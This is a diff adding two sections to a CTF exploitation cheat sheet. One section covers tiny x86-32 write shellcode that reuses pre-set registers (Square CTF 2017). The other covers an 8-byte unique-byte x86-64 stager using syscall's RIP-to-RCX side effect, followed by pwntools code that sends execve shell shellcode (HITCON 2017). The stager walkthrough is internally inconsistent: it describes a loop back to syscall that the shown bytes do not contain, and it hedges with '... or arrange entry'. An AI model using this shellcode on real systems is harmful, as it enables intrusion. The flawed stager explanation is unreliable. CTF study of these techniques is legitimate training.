@@ -16,6 +16,8 @@
 - [DynELF Automated Libc Discovery (RC3 CTF 2016)](#dynelf-automated-libc-discovery-rc3-ctf-2016)
 - [Constrained Shellcode in Small Buffers (TUM CTF 2016)](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
 - [Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
+- [Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
+- [Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)
 
 For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
 
@@ -494,3 +496,83 @@ rop = flat(
 **When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly -- it appears in every function with a stack canary.
 
 **References:** VolgaCTF 2017
+
+---
+
+## Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)
+
+**Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.
+
+**Example (x86-32 write syscall, entry: eax=4, ebx=1):**
+```asm
+; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
+; Goal: write flag buffer to stdout — only need ecx and edx
+
+; 3-byte: point ecx at the flag buffer
+lea ecx, [edi + flag_offset]   ; 3 bytes (if offset fits in 1 byte)
+
+; 2-byte: set edx (byte count)
+mov dl, 64                      ; 2 bytes
+
+; 2-byte: trigger syscall
+int 0x80                        ; 2 bytes
+
+; Total: 7 bytes — or as few as 5 if edx is already set
+```
+
+**Workflow:**
+```python
+# 1. Run the binary in gdb, break right before shellcode is executed
+# 2. Inspect all registers: info registers
+# 3. Identify which syscall arguments are already set
+# 4. Write only the instructions needed to fill missing arguments
+
+# Useful pre-initialized patterns:
+# - eax = syscall number already set by caller
+# - ebx = fd (stdin=0, stdout=1) from prior open/setup
+# - rdi, rsi from calling convention leakage
+# - rsp pointing into a writable region (for push-based addressing)
+```
+
+**Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.
+
+**References:** Square CTF 2017
+
+---
+
+## Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)
+
+**Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).
+
+**8-byte stager construction:**
+```asm
+; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
+; Side effect of syscall: rcx = RIP (address of next instruction after syscall)
+
+syscall          ; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8)
+                 ;           and sets rcx = &next_instr (= shellcode_buf + 2)
+push rcx         ; 1 byte:  51 — stack = [shellcode_buf + 2]
+pop rsi          ; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
+xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
+mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
+; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
+; ... or arrange entry so the next syscall reads 100 bytes to rsi
+```
+
+**Uniqueness constraint:**
+```python
+# All 8 bytes must be distinct (challenge-specific filter)
+# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
+# Verify: len(set(bytes)) == len(bytes)
+stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
+assert len(set(stager)) == len(stager)  # passes
+
+# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
+from pwn import *
+p.send(stager)
+p.send(asm(shellcraft.sh()))
+```
+
+**Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.
+
+**References:** HITCON CTF 2017
